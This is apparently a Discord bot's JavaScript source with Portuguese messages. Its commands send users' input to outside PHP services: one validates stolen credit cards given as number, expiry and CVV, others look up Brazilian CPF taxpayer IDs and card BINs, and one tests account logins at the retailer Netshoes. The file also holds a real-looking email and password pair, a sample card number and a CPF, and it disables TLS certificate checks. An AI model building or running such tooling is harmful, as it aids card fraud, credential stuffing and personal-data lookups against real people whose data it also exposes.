const Discord = require('discord.js');
const bot = new Discord.Client();

bot.on('message', (msg) => {

    if(msg.channel.type !== 'text' && !msg.author.bot) {
        msg.channel.send({embed: {
            color: 1752220,
            description: "O Bot só funciona no grupo."
          }});
        return;
    }	
    const message = msg.content.toLowerCase();
    if(message.startsWith('!chk')) {
        Check(msg);
    }
    if(message.startsWith('!cpf')) {
        CheckCPF(msg);
    }
	
    if(message.startsWith('!bin')) {
        VerifyBin(msg);
    }
	
    if(message.startsWith('!bot')) {
        FalarComObot(msg);
    }
	
    if(message.startsWith('!cep')) {
        PuxarCEP(msg);
    }
	
    if(message.startsWith('!on?')) {
        ons(msg);
    }
	
    if(message.startsWith('!comandos')) {
        MostrarComandos(msg);
    }
	
    if(message.startsWith('!NetShoesChecker')) {
        NetShoesChecker(msg);
    }
	
});

function Check(message) {
var cc = message.content.replace("!chk ", "").split("\n");
if(cc.length > 5){
return message.reply("5 CC POR VEZ FDP");
}
        cc.forEach(function (value) {
      Request("http://thelimao.kinghost.net/checker.php?ccs=" + value, function(result) {
            message.channel.send(result);
      });
        });

  }

  function CheckCPF(message) {
    var msg = message.content;
    var fields = msg.split(' ');
    var cpf = fields[1];
      Request("http://thelimao.kinghost.net/cpf.php?cpf=" + cpf, function(result) {
		message.channel.send(result);
      });
  }
  
  function VerifyBin(message) {
    var msg = message.content;
    var fields = msg.split(' ');
    var bin = fields[1];
      Request("http://thelimao.kinghost.net/bin.php?bin=" + bin, function(result) {
            message.channel.send({embed: {
                color: 0x8080ff,
                description: result
            }});
      });
  }

  function NetShoesChecker(message) {
    var msg = message.content;
    var fields = msg.split(' ');
    var dados = fields[1];
      Request("http://potential-winch.000webhostapp.com/netshoes.php?dados=william.douglas2013@bol.com.br|punto2008" + dados, function(result) {
            message.channel.send({embed: {
                color: 0x8080ff,
                description: result
            }});
      });
  }
  
    function FalarComObot(message) {
        var msg = message.content;
        var msge = msg.replace("!bot", "");
          Request("http://thelimao.kinghost.net/bot.php?msg=" + msge, function(result) {
                message.channel.send(result);
          });
      }
	  
    function ons(message) {
		message.channel.send("Estou online!");
    }
	
    function MostrarComandos(message) {
        message.reply('Comandos enviados no seu privado! (**Mensagens Diretas**)');
        var embed = new Discord.RichEmbed()
            .addField("!cpf", "Consulte um CPF! Exemplo: !cpf 06927173404", true)
			.addField("!bin", "Consulte uma BIN! Exemplo: !bin 498408", true)
			.addField("!chk", "Testador de Full! Exemplo: !chk 5464795013669943|05|2020|073", true)
			.addField("!bot", "Fale com o bot (Uma divers?o). Exemplo: !bot oi", true)
        message.author.sendEmbed(embed);
    }
	 
  function PuxarCEP(message) {
    var msg = message.content;
    var fields = msg.split(' ');
    var cep = fields[1];
      Request("http://localhost/bot/cep.php?cep=" + cep, function(result) {
            message.channel.send({embed: {
                color: 0x8080ff,
                description: result
            }});
      });
  }
	  
  function Request(request2, callback) {
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
    var request = require("request");
    request({
      url: request2
    }, function (error, response, body) {
       if (!error && response.statusCode == 200) {
          callback(body);
       } 
    });
  }



bot.login(process.env.BOT_TOKEN);
